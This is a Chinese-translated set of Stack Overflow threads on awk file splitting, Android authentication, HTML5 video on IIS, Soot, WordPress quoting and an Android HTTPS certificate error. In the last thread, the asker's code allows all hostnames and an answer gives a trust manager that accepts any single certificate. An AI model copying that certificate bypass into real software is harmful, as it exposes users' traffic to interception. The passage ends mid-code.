目标是我需要多个仅包含相应块的文件，例如上面的示例：结果我将有 3 个文件。`04_file.txt`,`05_file.txt`和`06_file.txt`. AND`05_file.txt`没有来自 04 块的任何行。最终`04_file.txt`文件将只有这个：

```
04..............
................
................ 
```

我的问题是它也将其他块保存到 04_file.txt..

我将不胜感激任何帮助。多谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T07:12:22.193

我假设唯一以 04、05 等开头的行是分隔不同块的行：

```
awk '
    BEGIN { mode="unknown" }
    /^04/ { mode="04" }
    /^05/ { mode="05" }
    /^06/ { mode="06" }
          { if (mode != "unknown") print $0 >> sprintf("%s_file.txt", mode)}' < $file 
```

`awk`基本上是一个根据模式执行操作的环境。每个模式动作语句都有以下形式

```
pattern { action } 
```

最简单的模式是匹配当前输入行的正则表达式。BEGIN 是一种特殊情况，它在读取输入之前“匹配”，并且还有一个 END “模式”，它在输入文件被使用后执行。

执行`awk`时逐行读取输入文件并执行模式与该行匹配的所有操作。在上面的代码中，`mode`如果输入行以 04、05 等开头 ()，则设置变量`^`。最后一行（没有模式）匹配所有行，并将整行写入相应的文件。

我将尝试用一些伪代码来总结这一点：

```
mode := "unknown"
for each line of input do
    if line starts with 04 then set mode to 04 endif
    if line starts with 05 then set mode to 05 endif
    if line starts with 06 then set mode to 06 endif

    # mode is now either "unknown" if no 04/05/06 pattern has been read
    # from the file yet or holds the most recently read block start (04/05/06)

    if mode is not "unknown" then
        append whole line to file named 'mode'_file.txt
    endif
endfor 
```

如果您想更进一步，请查看手册页或浏览网页以获取`awk`介绍。在那里，您还可以了解更多关于*模式*部分的信息，它可以做的不仅仅是匹配上面示例中的当前输入行。

* * *

如果所有块都以两位数字（任何数字）开头，则上面的代码可以缩短为

```
awk '
    BEGIN { mode="unknown" }
    /^[[:digit:]][[:digit:]]/ { mode=substr($0, 1, 2) }
          { if (mode != "unknown") print $0 >> sprintf("%s_file.txt", mode)}' < $file 
```

# android - 如何在 Android 中向远程服务器验证用户身份？

> ID：11806600
> 
> 赞同：0
> 
> 时间：2012-08-04T06:51:19.530
> 
> 标签：android, html, authentication

一段时间以来，我一直在制作独立的 Android 应用程序，但我现在想制作一个需要身份验证且不知道从哪里开始的应用程序。

例如，我需要执行以下操作：

1.  允许用户创建一个新帐户，该帐户将存储在远程服务器中。
2.  用户可以登录到他的帐户，并创建将存储在远程服务器中的类似日记的条目（照片+文本）。
3.  用户登录时将下载用户以前的条目。

你能为我指出正确的方向吗？

我已经知道如何在普通的 HTML/PHP 中完成所有这些工作。与原生相比，Web 应用程序会更好吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T07:03:24.590

这是有关为连接到远程服务器的 android 应用程序[制作登录屏幕的教程。](http://sarangasl.blogspot.com/2011/06/android-login-screen-using-httpclient.html)

您可能会使用类似的 post 方法向远程服务器发送更多数据，例如照片和文本。[这是](https://stackoverflow.com/questions/2935946/sending-images-using-http-post)将图像发送到服务器的好方法。

[这是一个从 URL 延迟加载图像的好方法](https://stackoverflow.com/questions/541966/android-how-do-i-do-a-lazy-load-of-images-in-listview)。

我希望这个`pointed you in the right direction`！

* * *

就个人而言，我更喜欢网络应用程序，因为您正在制作的内容非常基于网络，并且通过仅在 android 上制作应用程序，您会将能够使用网络应用程序的其他智能手机的用户拒之门外。

# html - html5 视频标签不播放 mp4 - IIS

> ID：11806601
> 
> 赞同：6
> 
> 时间：2012-08-04T06:51:46.303
> 
> 标签：html, iis, html5-video, mp4

我遇到的问题是我无法通过视频标签运行 mp4 视频。

服务器是 Win7 Ultimate 上的 IIS 7.5。

文件中的 htm 相当简单和香草：

```
<video width="360" height="240"  controls="controls" >
    <source src="test.mp4" type="video/mp4" />
</video> 
```

在“Internet Explorer”中，标签呈现一个带有红十字的黑框。

在 Firefox 中，标签呈现为带有浅灰色十字的灰色框，并显示“未找到支持格式和 MIME 类型的视频。”。

我知道你在想什么 - 添加 MIME 类型。我以两种不同的方式完成了这两种方法，但均未成功；首先我尝试在 IIS 中添加 MIME 类型，然后我尝试通过 web.config 添加

```
<staticContent>  
  <remove fileExtension=".mp4" />
  <mimeMap fileExtension=".mp4" mimeType="video/mp4"/>
</staticContent> 
```

这些都没有什么不同。我还把.mp4文件直接输入到地址坏了，IE和firefox都可以播放。此外，我还访问了在 IE 和 Firefox 中都使用“视频”标签的网站，他们可以正常播放视频。

有人可以帮我解释为什么这不会播放，我能做些什么来让它播放？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T21:43:35.590

绝对按照建议检查 Chrome/Safari。Firefox 不支持通过 HTML5 视频播放 MP4 文件。您需要一个 WEBM 文件或一个备用 Flash 播放器来支持 Firefox（我假设 Leanback 支持）。

总的来说，这听起来像是您的 IE9 版本的问题，并且可能仅限于您的机器。Leanback 播放器的视频在 IE9 中是否适合您？还是[videojs.com](http://videojs.com)上的视频？我已经在 IE9 中多次测试了后者。

否则，您的 mp4 文件中可能存在 IE9 无法支持的损坏。我[在另一个问题中](https://stackoverflow.com/questions/11809093/html5-video-plays-in-chrome-but-not-ie9)对此进行了更多解释。

# java - 如何知道 jimple 文件的方法中定义的变量对应于 java 类文件中的哪些变量？

> ID：11806609
> 
> 赞同：2
> 
> 时间：2012-08-04T06:53:59.583
> 
> 标签：java, class, variables, soot

Soot 将 java 类文件转换为 jimple 文件，并重命名了局部变量。现在我想知道 Soot 所依据的方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:00:29.003

[从这里](https://github.com/Sable/soot/blob/master/src/soot/javaToJimple/LocalGenerator.java)的 Soot 存储库中的代码来看，它似乎使用原始本地名称，同时使用前缀为的名称`$`和反映生成名称类型的单个字符。

# php - 删除引号wordpress表单输入

> ID：11806611
> 
> 赞同：-2
> 
> 时间：2012-08-04T06:54:18.703
> 
> 标签：php, wordpress

我的 wordpress 网站上有一个注册表单。以下是我用于注册用户的代码。

```
$username = $wpdb->escape(trim($_POST['txtFullName']));
$email = $wpdb->escape(trim($_POST['txtEmail']));
$password = $wpdb->escape(trim($_POST['txtPassword']));
$confirmpassword = $wpdb->escape(trim($_POST['txtConfirmPassword']));
gender = $wpdb->escape(trim($_POST['gender']));

 $user_id = wp_insert_user( array ('user_pass' => apply_filters('pre_user_user_pass', $password), 'user_login' => apply_filters('pre_user_user_login', $username), 'user_email' => apply_filters('pre_user_user_email', $email), 'role' => 'author' ) );

$authid = $user_id;

 do_action('user_register', $user_id);

// Insert into Post table               
$post = array();
$post['post_author'] = $authid ;
$post['post_date'] = date('Y-m-d H:i:s') ;
$post['post_date_gmt'] =  date('Y-m-d H:i:s') ;
$post['post_name'] = $username ;
$post['post_status'] = 'pending' ;
$post['post_title'] = $username ;
$post['post_type'] =  'post';
$post['post_category'] =  $gender;

wp_insert_post( $post, $wp_error ); 
```

注册后，我也尝试将用户插入帖子表中。如果我输入了用户名`test'name`，它将像`testname`在用户表中一样插入，但它将像`test\'name`在帖子表中一样插入。我也必须删除帖子表中的引号。怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:42:51.073

您可以使用 str_replace() 删除引号或任何字符

与您的示例匹配：

```
$post['post_name'] = str_replace("'", "", $username); 
```

# android - 如何在android中使用https url调用webservice

> ID：11806612
> 
> 赞同：1
> 
> 时间：2012-08-04T06:54:38.130
> 
> 标签：android

我正在尝试使用包含 HTTPS 的 URL 访问 Web 服务我收到没有对等证书错误。以下是我得到的错误。谁能帮帮我吗？

```
08-04 12:17:52.351: I/ApplicationPackageManager(8068): cscCountry is not German : INS
08-04 12:17:52.875: D/dalvikvm(8068): GC_EXTERNAL_ALLOC freed 60K, 48% free 2801K/5379K, external 504K/517K, paused 47ms
08-04 12:18:08.453: W/KeyCharacterMap(8068): Can't open keycharmap file
08-04 12:18:08.453: W/KeyCharacterMap(8068): Error loading keycharmap file '/system/usr/keychars/sec_keypad.kcm.bin'. hw.keyboards.0.devname='sec_keypad'
08-04 12:18:08.453: W/KeyCharacterMap(8068): Using default keymap: /system/usr/keychars/qwerty.kcm.bin
08-04 12:18:17.656: D/dalvikvm(8068): GC_CONCURRENT freed 198K, 47% free 3005K/5639K, external 617K/1023K, paused 4ms+4ms
08-04 12:18:17.695: W/System.err(8068): javax.net.ssl.SSLPeerUnverifiedException: No peer certificate
08-04 12:18:17.718: W/System.err(8068):     at org.apache.harmony.xnet.provider.jsse.SSLSessionImpl.getPeerCertificates(SSLSessionImpl.java:258)
08-04 12:18:17.718: W/System.err(8068):     at org.apache.http.conn.ssl.AbstractVerifier.verify(AbstractVerifier.java:93)
08-04 12:18:17.718: W/System.err(8068):     at org.apache.http.conn.ssl.SSLSocketFactory.createSocket(SSLSocketFactory.java:381)
08-04 12:18:17.718: W/System.err(8068):     at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:164)
08-04 12:18:17.718: W/System.err(8068):     at org.apache.http.impl.conn.AbstractPoolEntry.open(AbstractPoolEntry.java:164)
08-04 12:18:17.718: W/System.err(8068):     at org.apache.http.impl.conn.AbstractPooledConnAdapter.open(AbstractPooledConnAdapter.java:119)
08-04 12:18:17.718: W/System.err(8068):     at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:359)
08-04 12:18:17.718: W/System.err(8068):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:555)
08-04 12:18:17.718: W/System.err(8068):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:487)
08-04 12:18:17.718: W/System.err(8068):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:465)
08-04 12:18:17.718: W/System.err(8068):     at com.osi.wolla.login.Login$task.doInBackground(Login.java:223)
08-04 12:18:17.718: W/System.err(8068):     at com.osi.wolla.login.Login$task.doInBackground(Login.java:1)
08-04 12:18:17.718: W/System.err(8068):     at android.os.AsyncTask$2.call(AsyncTask.java:185)
08-04 12:18:17.718: W/System.err(8068):     at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:306)
08-04 12:18:17.718: W/System.err(8068):     at java.util.concurrent.FutureTask.run(FutureTask.java:138)
08-04 12:18:17.718: W/System.err(8068):     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1088)
08-04 12:18:17.718: W/System.err(8068):     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:581)
08-04 12:18:17.718: W/System.err(8068):     at java.lang.Thread.run(Thread.java:1019)
08-04 12:18:17.718: I/System.out(8068): response....null
08-04 12:18:17.757: I/System.out(8068): url....https://mywolla.com/mobwebservices/smails_rest.php
08-04 12:18:21.687: W/webserviceCall(8068): Error for URL https://mywolla.com/mobwebservices/smails_rest.php
08-04 12:18:21.687: W/webserviceCall(8068): javax.net.ssl.SSLPeerUnverifiedException: No peer certificate
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.harmony.xnet.provider.jsse.SSLSessionImpl.getPeerCertificates(SSLSessionImpl.java:258)
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.http.conn.ssl.AbstractVerifier.verify(AbstractVerifier.java:93)
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.http.conn.ssl.SSLSocketFactory.createSocket(SSLSocketFactory.java:381)
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:164)
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.http.impl.conn.AbstractPoolEntry.open(AbstractPoolEntry.java:164)
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.http.impl.conn.AbstractPooledConnAdapter.open(AbstractPooledConnAdapter.java:119)
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:359)
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:555)
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:487)
08-04 12:18:21.687: W/webserviceCall(8068):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:465)
08-04 12:18:21.687: W/webserviceCall(8068):     at com.osi.wolla.webserviceCall.getBundle(webserviceCall.java:870)
08-04 12:18:21.687: W/webserviceCall(8068):     at com.osi.wolla.login.Login$task.onPostExecute(Login.java:165)
08-04 12:18:21.687: W/webserviceCall(8068):     at com.osi.wolla.login.Login$task.onPostExecute(Login.java:1)
08-04 12:18:21.687: W/webserviceCall(8068):     at android.os.AsyncTask.finish(AsyncTask.java:417)
08-04 12:18:21.687: W/webserviceCall(8068):     at android.os.AsyncTask.access$300(AsyncTask.java:127)
08-04 12:18:21.687: W/webserviceCall(8068):     at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:429)
08-04 12:18:21.687: W/webserviceCall(8068):     at android.os.Handler.dispatchMessage(Handler.java:99)
08-04 12:18:21.687: W/webserviceCall(8068):     at android.os.Looper.loop(Looper.java:130)
08-04 12:18:21.687: W/webserviceCall(8068):     at android.app.ActivityThread.main(ActivityThread.java:3687)
08-04 12:18:21.687: W/webserviceCall(8068):     at java.lang.reflect.Method.invokeNative(Native Method)
08-04 12:18:21.687: W/webserviceCall(8068):     at java.lang.reflect.Method.invoke(Method.java:507)
08-04 12:18:21.687: W/webserviceCall(8068):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:867)
08-04 12:18:21.687: W/webserviceCall(8068):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:625)
08-04 12:18:21.687: W/webserviceCall(8068):     at dalvik.system.NativeStart.main(Native Method)
08-04 12:18:21.695: D/AndroidRuntime(8068): Shutting down VM
08-04 12:18:21.695: W/dalvikvm(8068): threadid=1: thread exiting with uncaught exception (group=0x40018578)
08-04 12:18:21.695: E/AndroidRuntime(8068): FATAL EXCEPTION: main
08-04 12:18:21.695: E/AndroidRuntime(8068): java.lang.NullPointerException
08-04 12:18:21.695: E/AndroidRuntime(8068):     at java.io.StringReader.<init>(StringReader.java:46)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at com.osi.wolla.xmlParser.parseUser(xmlParser.java:239)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at com.osi.wolla.login.Login$task.onPostExecute(Login.java:168)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at com.osi.wolla.login.Login$task.onPostExecute(Login.java:1)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at android.os.AsyncTask.finish(AsyncTask.java:417)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at android.os.AsyncTask.access$300(AsyncTask.java:127)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:429)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at android.os.Handler.dispatchMessage(Handler.java:99)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at android.os.Looper.loop(Looper.java:130)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at android.app.ActivityThread.main(ActivityThread.java:3687)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at java.lang.reflect.Method.invokeNative(Native Method)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at java.lang.reflect.Method.invoke(Method.java:507)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:867)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:625)
08-04 12:18:21.695: E/AndroidRuntime(8068):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

这是我的代码。

```
 final String URL = "https://mywolla.com/mobwebservices/svalidateuser.php?wsdl";

   String response = null;
            try {

                 HostnameVerifier hostnameVerifier = org.apache.http.conn.ssl.SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER;

                   DefaultHttpClient client = new DefaultHttpClient();

                   SchemeRegistry registry = new SchemeRegistry();
                   SSLSocketFactory socketFactory = SSLSocketFactory.getSocketFactory();
                   socketFactory.setHostnameVerifier((X509HostnameVerifier) hostnameVerifier);
                   registry.register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80));
                   registry.register(new Scheme("https", socketFactory, 443));
                   SingleClientConnManager mgr = new SingleClientConnManager(client.getParams(), registry);
                   DefaultHttpClient httpClient = new DefaultHttpClient(mgr, client.getParams());

                   // Set verifier      
                   HttpsURLConnection.setDefaultHostnameVerifier(hostnameVerifier);

                   // Example send http request

                   HttpPost httpPost = new HttpPost(URL);

                   HttpResponse response1 = httpClient.execute(httpPost); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T07:02:39.173

出于开发目的，您需要信任所有证书。使用本教程 (avilyne.com/?p=105)

将密钥库文件添加到 res/raw 目录。并将主要活动代码替换为以下内容。

```
package com.avilyne.android;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;
import javax.net.ssl.X509TrustManager;

import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ClientConnectionManager;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.conn.params.ConnManagerPNames;
import org.apache.http.conn.params.ConnPerRouteBean;
import org.apache.http.conn.scheme.LayeredSocketFactory;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.SingleClientConnManager;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.json.JSONObject;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final String SERVICE_URL =
    "https://192.168.2.101:8443/RestWebServiceDemo/rest/person";

    private static final String TAG = "AndroidRESTClientActivity";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void retrieveSampleData(View vw) {

        String sampleURL = SERVICE_URL + "/sample";

        WebServiceTask wst = new WebServiceTask(WebServiceTask.GET_TASK, this,
                "GETting data...");

        wst.execute(new String[] { sampleURL });

    }

    public void clearControls(View vw) {

        EditText edFirstName = (EditText) findViewById(R.id.first_name);
        EditText edLastName = (EditText) findViewById(R.id.last_name);
        EditText edEmail = (EditText) findViewById(R.id.email);

        edFirstName.setText("");
        edLastName.setText("");
        edEmail.setText("");

    }

    public void postData(View vw) {

        EditText edFirstName = (EditText) findViewById(R.id.first_name);
        EditText edLastName = (EditText) findViewById(R.id.last_name);
        EditText edEmail = (EditText) findViewById(R.id.email);

        String firstName = edFirstName.getText().toString();
        String lastName = edLastName.getText().toString();
        String email = edEmail.getText().toString();

        if (firstName.equals("") || lastName.equals("") || email.equals("")) {
            Toast.makeText(this, "Please enter in all required fields.",
                    Toast.LENGTH_LONG).show();
            return;
        }

        WebServiceTask wst = new WebServiceTask(WebServiceTask.POST_TASK, this,
                "Posting data...");

        wst.addNameValuePair("firstName", firstName);
        wst.addNameValuePair("lastName", lastName);
        wst.addNameValuePair("email", email);

        // the passed String is the URL we will POST to
        wst.execute(new String[] { SERVICE_URL });

    }

    public void handleResponse(String response) {

        EditText edFirstName = (EditText) findViewById(R.id.first_name);
        EditText edLastName = (EditText) findViewById(R.id.last_name);
        EditText edEmail = (EditText) findViewById(R.id.email);

        edFirstName.setText("");
        edLastName.setText("");
        edEmail.setText("");

        try {

            JSONObject jso = new JSONObject(response);

            String firstName = jso.getString("firstName");
            String lastName = jso.getString("lastName");
            String email = jso.getString("email");

            edFirstName.setText(firstName);
            edLastName.setText(lastName);
            edEmail.setText(email);

        } catch (Exception e) {
            Log.e(TAG, e.getLocalizedMessage(), e);
        }

    }

    private void hideKeyboard() {

        InputMethodManager inputManager = (InputMethodManager) MainActivity.this
                .getSystemService(Context.INPUT_METHOD_SERVICE);

        inputManager.hideSoftInputFromWindow(MainActivity.this
                .getCurrentFocus().getWindowToken(),
                InputMethodManager.HIDE_NOT_ALWAYS);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

    private class WebServiceTask extends AsyncTask<String, Integer, String> {

        public static final int POST_TASK = 1;
        public static final int GET_TASK = 2;

        private static final String TAG = "WebServiceTask";

        // connection timeout, in milliseconds (waiting to connect)
        // private static final int CONN_TIMEOUT = 3000;

        // socket timeout, in milliseconds (waiting for data)
        // private static final int SOCKET_TIMEOUT = 5000;

        private int taskType = GET_TASK;
        private Context mContext = null;
        private String processMessage = "Processing...";

        private ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();

        private ProgressDialog pDlg = null;

        public WebServiceTask(int taskType, Context mContext,
                String processMessage) {

            this.taskType = taskType;
            this.mContext = mContext;
            this.processMessage = processMessage;
        }

        public void addNameValuePair(String name, String value) {

            params.add(new BasicNameValuePair(name, value));
        }

        private void showProgressDialog() {

            pDlg = new ProgressDialog(mContext);
            pDlg.setMessage(processMessage);
            pDlg.setProgressDrawable(mContext.getWallpaper());
            pDlg.setProgressStyle(ProgressDialog.STYLE_SPINNER);
            pDlg.setCancelable(false);
            pDlg.show();

        }

        @Override
        protected void onPreExecute() {

            hideKeyboard();
            showProgressDialog();

        }

        protected String doInBackground(String... urls) {

            String url = urls[0];
            String result = "";

            HttpResponse response = doResponse(url);

            if (response == null) {
                return result;
            } else {

                try {

                    result = inputStreamToString(response.getEntity()
                            .getContent());

                } catch (IllegalStateException e) {
                    Log.e(TAG, e.getLocalizedMessage(), e);

                } catch (IOException e) {
                    Log.e(TAG, e.getLocalizedMessage(), e);
                }

            }

            return result;
        }

        @Override
        protected void onPostExecute(String response) {

            handleResponse(response);
            pDlg.dismiss();

        }

        // Establish connection and socket (data retrieval) timeouts
        /*
         * private HttpParams getHttpParams() {
         * 
         * HttpParams htpp = new BasicHttpParams();
         * 
         * HttpConnectionParams.setConnectionTimeout(htpp, CONN_TIMEOUT);
         * HttpConnectionParams.setSoTimeout(htpp, SOCKET_TIMEOUT);
         * 
         * return htpp; }
         */

        private HttpResponse doResponse(String url) {

            // Use our connection and data timeouts as parameters for our
            // DefaultHttpClient
            // HttpClient httpclient = new DefaultHttpClient(getHttpParams());

            DefaultHttpClient httpsclient = httpsClient();

            HttpResponse response = null;

            try {
                switch (taskType) {

                case POST_TASK:
                    HttpPost httppost = new HttpPost(url);
                    // Add parameters
                    httppost.setEntity(new UrlEncodedFormEntity(params));

                    response = httpsclient.execute(httppost); // httpclient.execute(httppost);
                    break;
                case GET_TASK:
                    HttpGet httpget = new HttpGet(url);
                    response = httpsclient.execute(httpget); // httpclient.execute(httpget);
                    break;
                }
            } catch (Exception e) {

                Log.e(TAG, e.getLocalizedMessage(), e);

            }

            return response;
        }

        private String inputStreamToString(InputStream is) {

            String line = "";
            StringBuilder total = new StringBuilder();

            // Wrap a BufferedReader around the InputStream
            BufferedReader rd = new BufferedReader(new InputStreamReader(is));

            try {
                // Read response until the end
                while ((line = rd.readLine()) != null) {
                    total.append(line);
                }
            } catch (IOException e) {
                Log.e(TAG, e.getLocalizedMessage(), e);
            }

            // Return full string
            return total.toString();
        }

    }

    private DefaultHttpClient httpsClient() {
        SchemeRegistry schemeRegistry = new SchemeRegistry();
        schemeRegistry.register(new Scheme("http", PlainSocketFactory
                .getSocketFactory(), 80));
        schemeRegistry.register(new Scheme("https", new EasySSLSocketFactory(),
                443));

        HttpParams httpParams = new BasicHttpParams();
        httpParams.setParameter(ConnManagerPNames.MAX_TOTAL_CONNECTIONS, 30);
        httpParams.setParameter(ConnManagerPNames.MAX_CONNECTIONS_PER_ROUTE,
                new ConnPerRouteBean(30));
        httpParams.setParameter(HttpProtocolParams.USE_EXPECT_CONTINUE, false);
        HttpProtocolParams.setVersion(httpParams, HttpVersion.HTTP_1_1);

        ClientConnectionManager cm = new SingleClientConnManager(httpParams,
                schemeRegistry);
        return new DefaultHttpClient(cm, httpParams);
    }

    private class EasySSLSocketFactory implements LayeredSocketFactory {
        private SSLContext sslcontext = null;

        private SSLContext createEasySSLContext() throws IOException {
            try {
                SSLContext context = SSLContext.getInstance("TLS");
                context.init(null,
                        new TrustManager[] { new EasyX509TrustManager(null) },
                        null);
                return context;
            } catch (Exception e) {
                throw new IOException(e.getMessage());
            }
        }

        private SSLContext getSSLContext() throws IOException {
            if (this.sslcontext == null) {
                this.sslcontext = createEasySSLContext();
            }
            return this.sslcontext;
        }

        /**
         * @see org.apache.http.conn.scheme.SocketFactory#connectSocket(java.net.Socket,
         *      java.lang.String, int, java.net.InetAddress, int,
         *      org.apache.http.params.HttpParams)
         */
        public Socket connectSocket(Socket sock, String host, int port,
                InetAddress localAddress, int localPort, HttpParams params)
                throws IOException, UnknownHostException,
                ConnectTimeoutException {
            int connTimeout = HttpConnectionParams.getConnectionTimeout(params);
            int soTimeout = HttpConnectionParams.getSoTimeout(params);

            InetSocketAddress remoteAddress = new InetSocketAddress(host, port);
            SSLSocket sslsock = (SSLSocket) ((sock != null) ? sock
                    : createSocket());

            if ((localAddress != null) || (localPort > 0)) {
                // we need to bind explicitly
                if (localPort < 0) {
                    localPort = 0; // indicates "any"
                }
                InetSocketAddress isa = new InetSocketAddress(localAddress,
                        localPort);
                sslsock.bind(isa);
            }

            sslsock.connect(remoteAddress, connTimeout);
            sslsock.setSoTimeout(soTimeout);
            return sslsock;

        }

        /**
         * @see org.apache.http.conn.scheme.SocketFactory#createSocket()
         */
        public Socket createSocket() throws IOException {
            return getSSLContext().getSocketFactory().createSocket();
        }

        /**
         * @see org.apache.http.conn.scheme.SocketFactory#isSecure(java.net.Socket)
         */
        public boolean isSecure(Socket socket) throws IllegalArgumentException {
            return true;
        }

        /**
         * @see org.apache.http.conn.scheme.LayeredSocketFactory#createSocket(java.net.Socket,
         *      java.lang.String, int, boolean)
         */
        public Socket createSocket(Socket socket, String host, int port,
                boolean autoClose) throws IOException, UnknownHostException {
            // return getSSLContext().getSocketFactory().createSocket(socket,
            // host, port, autoClose);
            return getSSLContext().getSocketFactory().createSocket(socket,
                    host, port, autoClose);
        }

        // -------------------------------------------------------------------
        // javadoc in org.apache.http.conn.scheme.SocketFactory says :
        // Both Object.equals() and Object.hashCode() must be overridden
        // for the correct operation of some connection managers
        // -------------------------------------------------------------------

        public boolean equals(Object obj) {
            return ((obj != null) && obj.getClass().equals(
                    EasySSLSocketFactory.class));
        }

        public int hashCode() {
            return EasySSLSocketFactory.class.hashCode();
        }

    }

    private class EasyX509TrustManager implements X509TrustManager {
        private X509TrustManager standardTrustManager = null;

        /**
         * Constructor for EasyX509TrustManager.
         */
        public EasyX509TrustManager(KeyStore keystore)
                throws NoSuchAlgorithmException, KeyStoreException {
            super();
            TrustManagerFactory factory = TrustManagerFactory
                    .getInstance(TrustManagerFactory.getDefaultAlgorithm());
            factory.init(keystore);
            TrustManager[] trustmanagers = factory.getTrustManagers();
            if (trustmanagers.length == 0) {
                throw new NoSuchAlgorithmException("no trust manager found");
            }
            this.standardTrustManager = (X509TrustManager) trustmanagers[0];
        }

        /**
         * @see 
         *      javax.net.ssl.X509TrustManager#checkClientTrusted(X509Certificate
         *      [],String authType)
         */
        public void checkClientTrusted(X509Certificate[] certificates,
                String authType) throws CertificateException {
            standardTrustManager.checkClientTrusted(certificates, authType);
        }

        /**
         * @see 
         *      javax.net.ssl.X509TrustManager#checkServerTrusted(X509Certificate
         *      [],String authType)
         */
        public void checkServerTrusted(X509Certificate[] certificates,
                String authType) throws CertificateException {
            if ((certificates != null) && (certificates.length == 1)) {
                certificates[0].checkValidity();
            } else {
                standardTrustManager.checkServerTrusted(certificates, authType);
            }
        }

        /**
         * @see javax.net.ssl.X509TrustManager#getAcceptedIssuers()
         */
        public X509Certificate[] getAcceptedIssuers() {
            return this.standardTrustManager.getAcceptedIssuers();
        }

    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-13T09:14:38.940

请使用以下代码：

```
public class WebAPIRequest {

public static String convertStreamToString(InputStream is)
        throws IOException {
    if (is != null) {
        StringBuilder sb = new StringBuilder();
        String line;
        try {
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(is, "UTF-8"));
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
        } finally {
            is.close();
        }
        return sb.toString();
    } else {
        return "";
    }
}

public static Document performPost(String url, String body) {
    Document doc = null;

    try {
        HttpParams basicparams = new BasicHttpParams();
        URI uri = new URI(url);
        HttpPost method = new HttpPost(uri);
        int timeoutConnection = 60000;
        HttpConnectionParams.setConnectionTimeout(basicparams,
                timeoutConnection);
